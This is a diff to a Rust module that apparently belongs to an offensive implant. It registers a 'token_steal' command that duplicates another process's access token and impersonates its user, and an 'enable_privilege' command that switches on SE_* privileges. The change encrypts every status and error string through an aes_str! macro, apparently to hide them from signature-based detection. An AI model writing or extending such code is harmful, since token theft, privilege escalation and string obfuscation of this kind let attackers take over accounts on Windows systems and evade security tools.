@@ -53,14 +53,14 @@ pub fn register(engine: &mut Engine) {
                 let h_proc = OpenProcess(
                     crate::config::config().ffi_windows.process_all_access, 0, pid);
                 if h_proc.is_null() {
-                    return format!("Error: OpenProcess failed ({})", GetLastError());
+                    return format!("{}{})", aes_str!("Error: OpenProcess failed ("), GetLastError());
                 }
                 let mut h_tok: HANDLE = std::ptr::null_mut();
                 if OpenProcessToken(h_proc,
                     TOKEN_DUPLICATE | crate::config::config().ffi_windows.token_query,
                     &mut h_tok) == 0 {
                     CloseHandle(h_proc);
-                    return format!("Error: OpenProcessToken failed ({})", GetLastError());
+                    return format!("{}{})", aes_str!("Error: OpenProcessToken failed ("), GetLastError());
                 }
                 let mut dup_tok: HANDLE = std::ptr::null_mut();
                 let ok = DuplicateTokenEx(
@@ -70,16 +70,16 @@ pub fn register(engine: &mut Engine) {
                 CloseHandle(h_tok);
                 CloseHandle(h_proc);
                 if ok == 0 {
-                    return format!("Error: DuplicateTokenEx failed ({})", GetLastError());
+                    return format!("{}{})", aes_str!("Error: DuplicateTokenEx failed ("), GetLastError());
                 }
                 let imp_ok = ImpersonateLoggedOnUser(dup_tok);
                 CloseHandle(dup_tok);
-                if imp_ok != 0 { format!("Impersonating PID {}", pid) }
-                else { format!("Error: ImpersonateLoggedOnUser failed ({})", GetLastError()) }
+                if imp_ok != 0 { format!("{}{}", aes_str!("Impersonating PID "), pid) }
+                else { format!("{}{})", aes_str!("Error: ImpersonateLoggedOnUser failed ("), GetLastError()) }
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: token_steal is Windows only (pid {})", pid_str)
+        format!("{}{})", aes_str!("Error: token_steal is Windows only (pid "), pid_str)
     });
 
     // Enable an SE_* privilege on the current process token.
@@ -100,12 +100,12 @@ pub fn register(engine: &mut Engine) {
                     TOKEN_ADJUST_PRIVS | crate::config::config().ffi_windows.token_query,
                     &mut h_tok,
                 ) == 0 {
-                    return format!("Error: OpenProcessToken failed ({})", GetLastError());
+                    return format!("{}{})", aes_str!("Error: OpenProcessToken failed ("), GetLastError());
                 }
                 let mut luid = Luid { low: 0, high: 0 };
                 if LookupPrivilegeValueA(std::ptr::null(), name.as_ptr(), &mut luid) == 0 {
                     CloseHandle(h_tok);
-                    return format!("Error: LookupPrivilegeValue failed ({})", GetLastError());
+                    return format!("{}{})", aes_str!("Error: LookupPrivilegeValue failed ("), GetLastError());
                 }
                 let tp = TokenPrivileges {
                     count:      1,
@@ -115,11 +115,11 @@ pub fn register(engine: &mut Engine) {
                     h_tok, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut(),
                 );
                 CloseHandle(h_tok);
-                if ok != 0 { format!("Enabled: {}", priv_name) }
-                else { format!("Error: AdjustTokenPrivileges failed ({})", GetLastError()) }
+                if ok != 0 { format!("{}{}", aes_str!("Enabled: "), priv_name) }
+                else { format!("{}{})", aes_str!("Error: AdjustTokenPrivileges failed ("), GetLastError()) }
             }
         }
         #[cfg(not(target_os = "windows"))]
-        format!("Error: enable_privilege is Windows only ({})", priv_name)
+        format!("{}{})", aes_str!("Error: enable_privilege is Windows only ("), priv_name)
     });
 }
